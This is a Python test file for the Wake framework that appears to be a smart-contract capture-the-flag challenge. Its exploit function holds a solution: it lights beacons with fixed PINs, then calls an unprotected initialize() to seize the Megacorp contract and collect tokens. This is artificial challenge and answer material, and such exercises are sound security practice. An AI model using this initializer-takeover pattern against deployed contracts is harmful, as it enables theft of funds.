from wake.testing import *

from pytypes.contracts.Megacorp import Megacorp
from pytypes.contracts.Towers import BeaconTower, BeaconTowerActivator, ProxyTower
from pytypes.contracts.Beacons import Beacon1, Beacon2, Beacon3
from pytypes.contracts.helpers import ISubtitlable

"""
    Write your exploit here. Always act like in production,
    do not alter the chain anyhow.
    You can deploy any contracts of your own, but do not alter the existing ones.
    Only initiate txs from within the `hackeer` account.
"""


def exploit(megacorp: Megacorp, hackeer: Account):
    megacorp.lightBeacon(pin=1234, index=0, from_=hackeer)
    megacorp.lightBeacon(pin=58732, index=1, from_=hackeer)
    megacorp.initialize(hackeer, from_=hackeer)
    megacorp.setRequestedPin(1234, from_=hackeer)
    megacorp.lightBeacon(pin=1234, index=2, from_=hackeer)


    print("\n\nadasdas\n\n")


def subtitles(tx: TransactionAbc):
    for event in tx.events:
        if isinstance(event, ISubtitlable.Subtitles):
            print(f"--- {event.subtitles} ---")


def revert_handler(e: TransactionRevertedError):
    if e.tx is not None:
        print(e.tx.call_trace)
        print(e.tx.console_logs)


@default_chain.connect()
@on_revert(revert_handler)
def test_hackee():
    default_chain.set_default_accounts(default_chain.accounts[0])
    default_chain.tx_callback = subtitles
    megacorp_owner = default_chain.accounts[1]  # do not touch
    hackeer = default_chain.accounts[2]  # this is you

    megacorp = Megacorp.deploy(from_=megacorp_owner)

    exploit(megacorp, hackeer)

    print(f"You managed to gain {megacorp.evaluate(hackeer)} MegaCorp tokens.")
